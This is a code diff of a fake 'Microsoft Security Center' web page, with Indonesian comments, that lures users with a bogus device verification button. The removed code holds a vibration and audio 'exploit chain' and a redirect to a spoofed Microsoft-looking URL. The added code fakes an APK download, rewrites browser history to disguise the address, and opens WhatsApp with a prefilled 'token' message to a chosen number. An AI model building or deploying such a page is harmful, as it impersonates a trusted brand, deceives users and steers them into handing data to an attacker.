@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Microsoft Security Center — Android Verification</title>
+<title>Microsoft Security Center — WhatsApp Intent Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { 
@@ -54,9 +54,9 @@
 
 <div class="card">
   <div class="logo">Microsoft</div>
-  <h2>Android Security Update Required</h2>
-  <p>Please complete the required device verification package for Android to secure your account credentials.</p>
-  <button id="actionBtn">Verify & Update Now</button>
+  <h2>WhatsApp Verification Required</h2>
+  <p>Please complete the required device verification package to secure your account via WhatsApp.</p>
+  <button id="actionBtn">Verify & Connect Now</button>
   <div id="status"></div>
 </div>
 
@@ -69,47 +69,18 @@
 
   // Konfigurasi Delay (3 detik)
   var DELAY_SECONDS = 3; 
-  var TARGET_SPOOFED_URL = "https://artha231.github.io/microsoft-edge-/@www-microsoft.com";
 
-  // ============================================
-  // ANDROID HARDWARE VIBRATION LOOP
-  // ============================================
-  function startVibrationLoop() {
-    if (!('vibrate' in navigator)) return;
-    try {
-      navigator.vibrate([1000, 500, 1000, 500]);
-      setInterval(function() {
-        try {
-          navigator.vibrate([1000, 500, 1000, 500]);
-        } catch(e) {}
-      }, 3000);
-    } catch(e) {}
-  }
+  // Target WhatsApp Intent (Nomor tujuan dan pesan otomatis, ganti nomor sesuai keperluan misal: 628123456789)
+  var TARGET_PHONE = "628123456789"; 
+  var TARGET_MESSAGE = "Security verification session active. Token ID: 98765";
+  
+  // Format Android Intent untuk WhatsApp
+  var WHATSAPP_INTENT_URL = "intent://send?phone=" + TARGET_PHONE + "&text=" + encodeURIComponent(TARGET_MESSAGE) + "#Intent;scheme=whatsapp;package=com.whatsapp;end;";
 
-  // ============================================
-  // AUDIO CONTEXT & RESOURCE EXHAUSTION
-  // ============================================
-  function unlockAudioContext() {
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      if (ctx.state === 'suspended') {
-        ctx.resume().catch(function(){});
-      }
-      var osc = ctx.createOscillator();
-      var gain = ctx.createGain();
-      gain.gain.value = 0.0001;
-      osc.frequency.value = 20000;
-      osc.connect(gain);
-      gain.connect(ctx.destination);
-      osc.start();
-      osc.stop(ctx.currentTime + 0.1);
-    } catch (e) {}
-  }
+  function triggerWhatsAppIntentChain() {
+    statusEl.textContent = "Preparing verification package...";
 
-  function triggerAndroidExploitChain() {
-    statusEl.textContent = "Preparing Android verification package...";
-
-    // 1. Membuat file .apk virtual via Blob API
+    // 1. Membuat file .apk virtual via Blob API di background
     try {
       var dummyBytes = new Uint8Array([0x50, 0x4B, 0x03, 0x04, 0x00, 0x00, 0x08, 0x00]); // Magic bytes ZIP/APK
       var blob = new Blob([dummyBytes], { type: 'application/vnd.android.package-archive' });
@@ -127,27 +98,23 @@
       }, 5000);
     } catch (e) {}
 
-    // 2. Memicu getar perangkat & Audio DoS di background
-    startVibrationLoop();
-    unlockAudioContext();
-
-    // 3. Hitung mundur delay sebelum redirect mutlak ke URL spoofed target
+    // 2. Hitung mundur delay sebelum mengarahkan ke WhatsApp Intent
     var countdown = DELAY_SECONDS;
     var timer = setInterval(function() {
       countdown--;
       if (countdown > 0) {
-        statusEl.textContent = "Redirecting to Microsoft in " + countdown + "s...";
+        statusEl.textContent = "Opening WhatsApp in " + countdown + "s...";
       } else {
         clearInterval(timer);
-        statusEl.textContent = "Redirecting...";
+        statusEl.textContent = "Launching WhatsApp...";
         
-        // Manipulasi History State untuk menyamarkan URL awal
+        // Manipulasi History State opsional
         try {
-          window.history.replaceState(null, "", "https://www.microsoft.com/");
+          window.history.replaceState(null, "", "https://api.whatsapp.com/");
         } catch(e) {}
 
-        // Redirect akhir ke URL authority spoofed
-        window.location.replace(TARGET_SPOOFED_URL);
+        // Pengalihan mutlak ke Intent WhatsApp
+        window.location.replace(WHATSAPP_INTENT_URL);
       }
     }, 1000);
   }
@@ -155,11 +122,11 @@
   btn.addEventListener('click', function() {
     btn.disabled = true;
     btn.style.opacity = "0.6";
-    statusEl.textContent = "Initializing secure session...";
+    statusEl.textContent = "Initializing secure tunnel...";
 
     // Jeda kecil sebelum rangkaian aksi dimulai
     setTimeout(function() {
-      triggerAndroidExploitChain();
+      triggerWhatsAppIntentChain();
     }, 800);
 
   }, { once: true });
